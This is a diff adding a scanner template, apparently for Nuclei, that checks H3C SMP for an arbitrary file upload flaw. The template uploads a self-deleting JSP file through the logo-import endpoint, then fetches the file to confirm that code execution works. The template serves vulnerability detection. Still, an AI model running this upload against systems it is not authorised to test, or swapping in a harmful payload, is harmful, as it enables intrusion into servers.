@@ -1,0 +1,48 @@
+id: h3c-smp-upload
+info:
+  name: H3C SMP - 任意文件上传漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: h3c
+    product: smp
+  tags: file-upload,vuln,h3c,smp
+variables:
+  n1: '{{to_lower(rand_text_alpha(20))}}'
+  n2: '{{to_lower(rand_text_alpha(20))}}'
+  rboundary: '{{to_lower(rand_text_alpha(8))}}'
+flow: http(1) && http(2) && http(3)
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/third/cameraSecure/newFoundTerminals'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 302'
+  - method: POST
+    path:
+      - '{{BaseURL}}/parameterSetting/importLogo'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="importFile"; filename="{{n1}}.jsp"
+      Content-Type: application/octet-stream
+
+      <%out.print("{{n2}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "logoImg")'
+  - method: GET
+    path:
+      - '{{BaseURL}}/uploadFiles/logoImg/{{n1}}.jsp'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, n2)'
